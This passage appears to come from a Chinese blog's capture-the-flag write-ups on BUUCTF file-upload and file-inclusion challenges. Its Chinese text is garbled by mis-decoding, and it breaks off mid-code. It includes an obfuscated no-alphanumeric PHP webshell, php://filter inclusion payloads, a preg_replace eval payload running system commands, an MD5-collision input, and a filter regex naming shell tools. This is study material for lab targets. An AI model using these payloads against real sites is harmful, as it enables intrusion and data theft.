<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200829113331.png" alt=""></p>
<p><code>89 50 4E 47 0D 0A 1A 0A</code> æ˜¯PNGå¤´éƒ¨ç½²ååŸŸï¼Œè¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªPNGå›¾ç‰‡<br>
<code>00 00 00 0D</code> æè¿°IHDRå¤´éƒ¨çš„å¤§å°<br>
<code>49 48 44 52</code> æ˜¯Chunk Type Code, è¿™é‡ŒChunk Type Code=IHDR</p>
<p>æ¥ä¸‹æ¥éœ€è¦äº†è§£finfo_fileå‡½æ•°å’Œgetimagesizeå‡½æ•°çš„åŒºåˆ«å°±åœ¨äºï¼š<code>FILEINFO</code> å¯ä»¥è¯†åˆ« png å›¾ç‰‡( åå…­è¿›åˆ¶ä¸‹ )çš„ç¬¬ä¸€è¡Œï¼Œè€Œ <code>getimagesize</code> ä¸å¯ä»¥ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200829113733.png" alt=""></p>
<h2 id="SUCTF-2019-getshell">SUCTF 2019 getshell</h2>
<h3 id="è€ƒç‚¹-v10">è€ƒç‚¹</h3>
<ul>
<li>æ— æ•°å­—å­—æ¯webshell</li>
</ul>
<h3 id="è§£é¢˜-v10">è§£é¢˜</h3>
<p>å¯ç”¨å­—ç¬¦ï¼š<code>$().;=[]_~</code></p>
<p>å–åç»•è¿‡ï¼Œwebshellï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_=~(ç);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line">$_=~(æŒŸ);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line">$_=~(æŒŸ);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line">$_=~(éš™);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line">$_=~(å¸);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line">$_=~(å‹‹);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line"></span><br><span class="line">$_=~(æ ¡);</span><br><span class="line">$___.=$_[[]==[]];</span><br><span class="line">$_=~(ä¸‹);</span><br><span class="line">$___.=$_[[]==[]];</span><br><span class="line">$_=~(çº¤);</span><br><span class="line">$___.=$_[[]==[]];</span><br><span class="line">$_=~(å«Œ);</span><br><span class="line">$___.=$_[[]==[]];</span><br><span class="line">$___=$$___;</span><br><span class="line">$__($___[_]);</span><br></pre></td></tr></table></figure>
<p>flagåœ¨envç¯å¢ƒå˜é‡ä¸­ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200916134726.png" alt=""></p>
<h2 id="SUCTF-2019-Upload-Labs-2">SUCTF 2019 Upload Labs 2</h2>
<h3 id="è€ƒç‚¹-v11">è€ƒç‚¹</h3>
<h3 id="è§£é¢˜-v11">è§£é¢˜</h3>
<p>admin.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ad</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $cmd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $clazz;</span><br><span class="line">    <span class="keyword">public</span> $func1;</span><br><span class="line">    <span class="keyword">public</span> $func2;</span><br><span class="line">    <span class="keyword">public</span> $func3;</span><br><span class="line">    <span class="keyword">public</span> $instance;</span><br><span class="line">    <span class="keyword">public</span> $arg1;</span><br><span class="line">    <span class="keyword">public</span> $arg2;</span><br><span class="line">    <span class="keyword">public</span> $arg3;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;cmd = $cmd;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;clazz = $clazz;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func1 = $func1;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func2 = $func2;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func3 = $func3;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg1 = $arg1;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg2 = $arg2;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg3 = $arg3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        $reflect = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;clazz);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;instance = $reflect-&gt;newInstanceArgs();</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func1);</span><br><span class="line">        $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg1);</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func2);</span><br><span class="line">        $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg2);</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func3);</span><br><span class="line">        $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        system(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;admin&#x27;</span>]))&#123;</span><br><span class="line">        $cmd = $_POST[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        $clazz = $_POST[<span class="string">&#x27;clazz&#x27;</span>];</span><br><span class="line">        $func1 = $_POST[<span class="string">&#x27;func1&#x27;</span>];</span><br><span class="line">        $func2 = $_POST[<span class="string">&#x27;func2&#x27;</span>];</span><br><span class="line">        $func3 = $_POST[<span class="string">&#x27;func3&#x27;</span>];</span><br><span class="line">        $arg1 = $_POST[<span class="string">&#x27;arg1&#x27;</span>];</span><br><span class="line">        $arg2 = $_POST[<span class="string">&#x27;arg2&#x27;</span>];</span><br><span class="line">        $arg2 = $_POST[<span class="string">&#x27;arg3&#x27;</span>];</span><br><span class="line">        $admin = <span class="keyword">new</span> Ad($cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3);</span><br><span class="line">        $admin-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You r not admin!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="TODO">TODO</h3>
<h2 id="HarekazeCTF2019-Avatar-Uploader-2">HarekazeCTF2019 Avatar Uploader 2</h2>
<h3 id="TODO-v2">TODO</h3>
<h2 id="D3CTF-2019-EzUpload">D3CTF 2019 EzUpload</h2>
<h3 id="TODO-v3">TODO</h3>
]]></content>
      <categories>
        <category>CTF</category>
        <category>æ–‡ä»¶ä¸Šä¼ </category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctfåˆ·é¢˜â€”â€”æ–‡ä»¶åŒ…å«</title>
    <url>/Web_security/ctf_writeup/12.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<h1 id="BUUCTFåˆ·é¢˜â€”â€”æ–‡ä»¶åŒ…å«">BUUCTFåˆ·é¢˜â€”â€”æ–‡ä»¶åŒ…å«</h1>
<h2 id="BSidesCTF2020-Had-a-bad-day">BSidesCTF2020 Had a bad day</h2>
<h3 id="è€ƒç‚¹">è€ƒç‚¹</h3>
<ul>
<li>LFI</li>
<li>PHPä¼ªåè®®</li>
</ul>
<h3 id="è§£é¢˜">è§£é¢˜</h3>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200707180351.png" alt=""></p>
<p><code>index.php</code>æœ‰ä¸€ä¸ªå‚æ•°æ˜¯woofersï¼Œæµ‹è¯•SQLæ³¨å…¥çš„æ˜¯å‘ç°äº†includeå‡½æ•°çš„æŠ¥é”™ï¼Œç”¨PHPä¼ªåè®®è¯»å–æ–‡ä»¶</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200707180515.png" alt=""></p>
<p>å®¡è®¡<code>index.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $file = $_GET[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($file))&#123;</span><br><span class="line">        <span class="keyword">if</span>( strpos( $file, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || strpos( $file, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || strpos( $file, <span class="string">&quot;index&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">include</span> ($file . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ä¼ å…¥çš„<code>category</code>éœ€è¦æœ‰<code>woofers</code>,<code>meowers</code>,<code>index</code>æ‰èƒ½åŒ…å«ä¼ å…¥ä»¥ä¼ å…¥åä¸ºæ–‡ä»¶åçš„æ–‡ä»¶ï¼Œæˆ‘ä»¬è¦æƒ³åŠæ³•åŒ…å«flag.phpï¼Œç›´æ¥è¯•ä¸€ä¸‹åœ¨woofersåé¢åŠ <code>/../flag</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200707182200.png" alt=""></p>
<p>ä¸Šé¢è¿™ä¸ªåº”è¯¥æ˜¯éé¢„æœŸè§£ï¼Œæˆ‘éšä¾¿è¯•ä¸€ä¸‹ç«Ÿç„¶ç›´æ¥å‡ºæ¥äº†ï¼Œè¿™ä¸ªæ€è·¯å¯ä»¥è®°ç€ã€‚</p>
<p>é¢„æœŸè§£çš„payloadçš„æ€è·¯æ˜¯åˆ©ç”¨php://filterä¼ªåè®®å¯ä»¥å¥—ä¸€å±‚åè®®è¯»å–<code>flag.php</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;index&#x2F;resource&#x3D;flag</span><br></pre></td></tr></table></figure>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File">æå®¢å¤§æŒ‘æˆ˜ 2019 Secret File</h2>
<h3 id="è€ƒç‚¹-v2">è€ƒç‚¹</h3>
<ul>
<li>ä¿¡æ¯æ³„éœ²</li>
<li>æ–‡ä»¶åŒ…å«</li>
</ul>
<h3 id="è§£é¢˜-v2">è§£é¢˜</h3>
<p>æŸ¥çœ‹æºç </p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200507093908.png" alt=""></p>
<p>è®¿é—®<code>Archive_room.php</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200507093947.png" alt=""></p>
<p>BurpæŠ“åŒ…</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200507094008.png" alt=""></p>
<p>è®¿é—®<code>secr3t.php</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    $file&#x3D;$_GET[&#39;file&#39;];</span><br><span class="line">    if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">        echo &quot;Oh no!&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    include($file); </span><br><span class="line">&#x2F;&#x2F;flagæ”¾åœ¨äº†flag.phpé‡Œ</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<p><code>include($file)</code>æ–‡ä»¶åŒ…å«ï¼Œè€Œä¸”ä¸èƒ½ç”¨<code>input</code>ã€<code>data</code>ç­‰ä¼ªåè®®æ¥è¯»å–æ–‡ä»¶ã€‚</p>
<blockquote>
<p><a href="https://ca0y1h.top/Web_security/basic_learning/13.%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">æ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨æ–¹å¼</a></p>
</blockquote>
<p>payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
<h2 id="ACTF2020-æ–°ç”Ÿèµ›-Include">ACTF2020 æ–°ç”Ÿèµ› Include</h2>
<h3 id="TODO">TODO</h3>
<h2 id="BJDCTF2020-ZJCTF-ä¸è¿‡å¦‚æ­¤">BJDCTF2020 ZJCTF ä¸è¿‡å¦‚æ­¤</h2>
<h3 id="è€ƒç‚¹-v3">è€ƒç‚¹</h3>
<ul>
<li>PHPä¼ªåè®®è¯»å–æ–‡ä»¶</li>
<li>preg_matchå‘½ä»¤æ‰§è¡Œ</li>
</ul>
<h3 id="è§£é¢˜-v3">è§£é¢˜</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$text = $_GET[<span class="string">&quot;text&quot;</span>];</span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>($file);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å¾ˆæ˜æ˜¾è¦ä½¿ç”¨æ–‡ä»¶åŒ…å«è¯»å–<code>next.php</code>ï¼Œpayloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;efb75f40-dbf6-4b18-ab6e-d3e05813d2bb.node3.buuoj.cn&#x2F;?text&#x3D;php:&#x2F;&#x2F;input&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;next.php</span><br></pre></td></tr></table></figure>
<p>POSTï¼š<code>I have a dream</code></p>
<p>è§£ç å¾—åˆ°<code>next.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$id = $_GET[<span class="string">&#x27;id&#x27;</span>]; </span><br><span class="line">$_SESSION[<span class="string">&#x27;id&#x27;</span>] = $id; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params">$re, $str</span>) </span>&#123; </span><br><span class="line">    <span class="keyword">return</span> preg_replace( <span class="string">&#x27;/(&#x27;</span> . $re . <span class="string">&#x27;)/ei&#x27;</span>, <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>, $str ); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $re =&gt; $str) &#123; </span><br><span class="line">    <span class="keyword">echo</span> complex($re, $str). <span class="string">&quot;\n&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">    @<span class="keyword">eval</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>]); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæ¶‰åŠåˆ°<code>preg_replace()</code>å‡½æ•°çš„å‘½ä»¤æ‰§è¡Œï¼Œé™„ä¸Šåˆ†ææ–‡ç« ï¼š<a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a></p>
<p>payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;efb75f40-dbf6-4b18-ab6e-d3e05813d2bb.node3.buuoj.cn&#x2F;next.php?\S*&#x3D;$&#123;getFlag()&#125;&amp;cmd&#x3D;system(%27cat%20&#x2F;flag%27);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>æ‰§è¡Œsystemå‡½æ•°åé¢è¦åŠ åˆ†å·ã€‚</p>
</blockquote>
<h2 id="å®‰æ´µæ¯2019-easyweb">å®‰æ´µæ¯2019 easyweb</h2>
<h3 id="è€ƒç‚¹-v4">è€ƒç‚¹</h3>
<ul>
<li>æ–‡ä»¶åŒ…å«</li>
</ul>
<h3 id="è§£é¢˜-v4">è§£é¢˜</h3>
<p>è¿›å…¥é¢˜ç›®ä¹‹åè§‚å¯Ÿurlï¼š<code>http://4e78d6a5-8227-41e7-95d5-6b01336c4a5c.node3.buuoj.cn/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</code>ï¼Œimgçš„å‚æ•°æ¯”è¾ƒå¯ç–‘ï¼Œç”¨base64è§£ç ä¸€æ¬¡å¾—åˆ°<code>MzUzNTM1MmU3MDZlNjc=</code>ï¼Œæ„Ÿè§‰åˆè¦base64è§£ç ä¸€æ¬¡å¾—åˆ°<code>3535352e706e67</code>ï¼Œè¿™ä¸ªå°±æ¯”è¾ƒåƒ16è¿›åˆ¶äº†ï¼Œè½¬ç åå‘ç°æ˜¯<code>555.png</code>ï¼Œå¾ˆæ˜æ˜¾çš„æ–‡ä»¶åŒ…å«ï¼Œå†™ä¸€ä¸ªpythonè„šæœ¬ç”Ÿæˆ<code>index.php</code>çš„å‚æ•°ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">filename=<span class="string">&#x27;index.php&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">hex = binascii.b2a_hex(filename)</span><br><span class="line">encode_str = base64.encode(base64.encode(hex))</span><br><span class="line">print(encode_str)</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°<code>index.php</code>çš„æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    header(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/i&quot;</span>, $file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixiï½ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . $txt . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $cmd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, $cmd)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)$_POST[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)$_POST[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5($_POST[<span class="string">&#x27;a&#x27;</span>]) === md5($_POST[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ç¬¬ä¸€æ­¥md5ç¢°æ’ï¼Œå’Œæˆ‘ä¹‹å‰åœ¨è¿™ç¯‡æ–‡ç« BJDCTF2020 Easy MD5è®°å½•çš„ä¸€æ ·ï¼ŒPOSTæ•°æ®ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;1%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00+%F7%B9%9D%AB%97o%3F%E9%85%14%1E%A9%88%86%EDm%02Sj%B1%85%92%5E%07%8E%82Z%97%BC%AD%10%22%C6%CB%D8%CC%8CG%E2%EB%FF%C89%3E%D6%D1mE%AAL4%E1%F2d%CD%E1%073c%04%DA6%1C%BFj%8B%C9%08U%17%22%9D%F3%C5ne%FA%A5%2B%A9%F7%8F_D%E22%D0%AD%B5+%CF%06%60%A8%C7%D3%FB%12T%AF%C2%914%B4B%0A%5C%2C%3C%F9%99P%ED%B0%8E%E4%C7%A8%C2%F6%D0%A6%90%BC%B5%2F%ED&amp;b&#x3D;1%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00+%F7%B9%9D%AB%97o%3F%E9%85%14%1E%A9%88%86%EDm%02S%EA%B1%85%92%5E%07%8E%82Z%97%BC%AD%10%22%C6%CB%D8%CC%8CG%E2%EB%FF%C89%3EV%D2mE%AAL4%E1%F2d%CD%E1%073%E3%04%DA6%1C%BFj%8B%C9%08U%17%22%9D%F3%C5ne%FA%A5%2B%A9%F7%8F%DFD%E22%D0%AD%B5+%CF%06%60%A8%C7%D3%FB%12T%AF%C2%914%B4B%0A%5C%2C%BC%F8%99P%ED%B0%8E%E4%C7%A8%C2%F6%D0%A6%10%BC%B5%2F%ED</span><br></pre></td></tr></table></figure>
<p>ç¬¬äºŒæ­¥å°±æ˜¯ç»•è¿‡è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œéœ€è¦FUZZ Linuxå‘½ä»¤å»æ‰§è¡Œè¯»å–æ–‡ä»¶ï¼Œè¿™é‡Œæä¾›ä¸¤ä¸ªå‘½ä»¤ï¼š<code>sort</code>å’Œ<code>strings</code>ã€‚</p>
<p>å¦å¤–ï¼Œè¿‡æ»¤åæ–œæ  <code>|\\|\\\\|</code>çš„è¿™ä¸¤ä¸ªæ­£åˆ™æ²¡æœ‰å†™å¥½ï¼Œå¯¼è‡´äº†åæ–œæ çš„é€ƒé€¸ï¼Œç›´æ¥ç”¨<code>ca\t</code>å‘½ä»¤ã€‚</p>
<blockquote>
<p>å…³äºè¿™ä¸ªåæ–œæ é€ƒé€¸æˆ‘æ˜¯çœŸçš„æ²¡å¤ªçœ‹æ‡‚ã€‚ã€‚ã€‚</p>
</blockquote>
<h2 id="BJDCTF2nd-æ–‡ä»¶æ¢æµ‹">BJDCTF2nd æ–‡ä»¶æ¢æµ‹</h2>
<h3 id="è€ƒç‚¹-v5">è€ƒç‚¹</h3>
<ul>
<li>æ–‡ä»¶åŒ…å«</li>
<li>SSRF</li>
<li>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</li>
<li>Sessionç»•è¿‡</li>
</ul>
<h3 id="è§£é¢˜-v5">è§£é¢˜</h3>
<p>æŸ¥çœ‹HTTPè¿”å›å¤´å‘ç°æœ‰ä¸€ä¸ªHintï¼š<code>home.php</code>ï¼Œè®¿é—®åè§‚å¯Ÿurl</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200712115335.png" alt=""></p>
<p>fileå‚æ•°æ˜¯ä¸€ä¸ªæ–‡ä»¶åï¼Œç”¨phpä¼ªåè®®å°è¯•æ–‡ä»¶åŒ…å«</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200712115431.png" alt=""></p>
<p><code>home.php</code>æ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">setcookie(<span class="string">&quot;y1ng&quot;</span>, sha1(md5(<span class="string">&#x27;y1ng&#x27;</span>)), time() + <span class="number">3600</span>);</span><br><span class="line">setcookie(<span class="string">&#x27;your_ip_address&#x27;</span>, md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]), time()+<span class="number">3600</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/\^|\~|&amp;|\|/&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;forbidden&quot;</span>);</span><br><span class="line">   